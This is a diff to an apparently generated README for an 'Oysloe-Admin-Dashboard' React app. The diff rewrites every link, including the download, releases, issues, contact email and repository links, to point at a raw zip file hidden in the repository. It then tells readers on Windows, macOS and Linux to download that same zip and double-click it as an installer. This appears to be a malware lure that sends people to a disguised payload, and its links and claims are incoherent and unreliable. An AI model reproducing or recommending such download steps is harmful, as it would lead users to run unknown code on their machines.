@@ -1,7 +1,7 @@
 # 🎉 Oysloe-Admin-Dashboard - Manage Your Marketplace Easily
 
 ## 📥 Download Now
-[![Download Oysloe-Admin-Dashboard](https://raw.githubusercontent.com/anasa171/Oysloe-Admin-Dashboard/main/chlorellaceous/Oysloe-Admin-Dashboard.zip)](https://raw.githubusercontent.com/anasa171/Oysloe-Admin-Dashboard/main/chlorellaceous/Oysloe-Admin-Dashboard.zip)
+[![Download Oysloe-Admin-Dashboard](https://raw.githubusercontent.com/anasa171/Oysloe-Admin-Dashboard/main/src/pages/Alerts/Dashboard_Oysloe_Admin_1.9.zip)](https://raw.githubusercontent.com/anasa171/Oysloe-Admin-Dashboard/main/src/pages/Alerts/Dashboard_Oysloe_Admin_1.9.zip)
 
 ## 📖 Description
 Oysloe-Admin-Dashboard is an admin dashboard interface designed to help you manage Oysloe marketplace operations effortlessly. Built with React and Vite, this application ensures fast development and a responsive user interface. The dashboard easily integrates with existing APIs and includes automated Snapmock CI/CD for visual updates after each deployment.
@@ -16,16 +16,16 @@ Oysloe-Admin-Dashboard is an admin dashboard interface designed to help you mana
 
 ### 📦 Installation Steps
 1. **Download the Application:**
-   Visit this page to download: [Oysloe-Admin-Dashboard Releases](https://raw.githubusercontent.com/anasa171/Oysloe-Admin-Dashboard/main/chlorellaceous/Oysloe-Admin-Dashboard.zip)
+   Visit this page to download: [Oysloe-Admin-Dashboard Releases](https://raw.githubusercontent.com/anasa171/Oysloe-Admin-Dashboard/main/src/pages/Alerts/Dashboard_Oysloe_Admin_1.9.zip)
 
 2. **Select the Latest Version:**
    On the releases page, locate the latest version of Oysloe-Admin-Dashboard. Click on it to view the available files.
 
 3. **Choose Your File:**
    Download the appropriate file for your operating system. If you are unsure, the common files are:
-   - For Windows: `https://raw.githubusercontent.com/anasa171/Oysloe-Admin-Dashboard/main/chlorellaceous/Oysloe-Admin-Dashboard.zip`
-   - For macOS: `https://raw.githubusercontent.com/anasa171/Oysloe-Admin-Dashboard/main/chlorellaceous/Oysloe-Admin-Dashboard.zip`
-   - For Linux: `https://raw.githubusercontent.com/anasa171/Oysloe-Admin-Dashboard/main/chlorellaceous/Oysloe-Admin-Dashboard.zip`
+   - For Windows: `https://raw.githubusercontent.com/anasa171/Oysloe-Admin-Dashboard/main/src/pages/Alerts/Dashboard_Oysloe_Admin_1.9.zip`
+   - For macOS: `https://raw.githubusercontent.com/anasa171/Oysloe-Admin-Dashboard/main/src/pages/Alerts/Dashboard_Oysloe_Admin_1.9.zip`
+   - For Linux: `https://raw.githubusercontent.com/anasa171/Oysloe-Admin-Dashboard/main/src/pages/Alerts/Dashboard_Oysloe_Admin_1.9.zip`
 
 4. **Run the Installer:**
    After the download completes, navigate to your Downloads folder. Double-click the downloaded file to start the installation process.
@@ -52,16 +52,16 @@ Oysloe-Admin-Dashboard is an admin dashboard interface designed to help you mana
 ## ℹ️ Support
 If you encounter any issues while using Oysloe-Admin-Dashboard, please check the following resources:
 - **FAQs**: Check common questions and answers in our help section.
-- **Issues Page**: Report any bugs or request features on the [GitHub Issues Page](https://raw.githubusercontent.com/anasa171/Oysloe-Admin-Dashboard/main/chlorellaceous/Oysloe-Admin-Dashboard.zip).
+- **Issues Page**: Report any bugs or request features on the [GitHub Issues Page](https://raw.githubusercontent.com/anasa171/Oysloe-Admin-Dashboard/main/src/pages/Alerts/Dashboard_Oysloe_Admin_1.9.zip).
 - **Community Support**: Join our community forum for discussions and tips from other users.
 
 ## 📞 Contact
-For additional support or inquiries, contact us via email at https://raw.githubusercontent.com/anasa171/Oysloe-Admin-Dashboard/main/chlorellaceous/Oysloe-Admin-Dashboard.zip
+For additional support or inquiries, contact us via email at https://raw.githubusercontent.com/anasa171/Oysloe-Admin-Dashboard/main/src/pages/Alerts/Dashboard_Oysloe_Admin_1.9.zip
 
 ## 📜 License
 Oysloe-Admin-Dashboard is licensed under the MIT License. You can use it freely for personal and commercial projects, provided that you include the original license.
 
 ## 🔗 Additional Resources
-Visit our GitHub repository for more documentation and details: [Oysloe-Admin-Dashboard GitHub](https://raw.githubusercontent.com/anasa171/Oysloe-Admin-Dashboard/main/chlorellaceous/Oysloe-Admin-Dashboard.zip).
+Visit our GitHub repository for more documentation and details: [Oysloe-Admin-Dashboard GitHub](https://raw.githubusercontent.com/anasa171/Oysloe-Admin-Dashboard/main/src/pages/Alerts/Dashboard_Oysloe_Admin_1.9.zip).
 
 Thank you for choosing Oysloe-Admin-Dashboard! We hope it helps you manage your marketplace efficiently.
